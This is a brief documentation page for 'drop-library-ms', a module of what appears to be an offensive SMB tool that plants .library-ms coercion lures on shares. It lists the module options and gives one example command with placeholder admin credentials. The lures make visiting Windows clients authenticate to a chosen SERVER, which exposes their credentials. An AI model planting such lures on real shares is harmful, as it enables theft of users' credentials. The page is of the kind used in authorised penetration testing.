# drop-library-ms

Drops .library-ms coercion lures (SERVER=..., NAME=..., IGNORE=..., CLEANUP=True)

Options: `CLEANUP=...`, `IGNORE=...`, `NAME=...`, `SERVER=...`

```bash
atlas smb 192.168.1.5 -u admin -p 'Password1!' -M drop-library-ms -o CLEANUP=...,IGNORE=...,NAME=...,SERVER=...
```

Via Titanis (`SmbDropLibraryMsModule.cs`).
